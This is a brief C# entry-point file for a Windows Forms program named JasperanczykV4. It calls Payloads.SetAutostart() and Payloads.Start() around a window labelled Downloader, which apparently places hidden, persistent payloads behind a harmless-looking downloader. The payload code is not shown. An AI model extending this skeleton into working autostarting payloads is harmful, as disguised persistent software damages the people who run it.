using System.Media;
using System.Text;

namespace JasperanczykV4
{
    internal static class Program
    {
        /// <summary>
        ///  The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            // To customize application configuration such as set high DPI settings or default font,
            // see https://aka.ms/applicationconfiguration.
            Payloads.SetAutostart();
            ApplicationConfiguration.Initialize();
            Application.Run(new Downloader());
            Payloads.Start();
        }
    }
}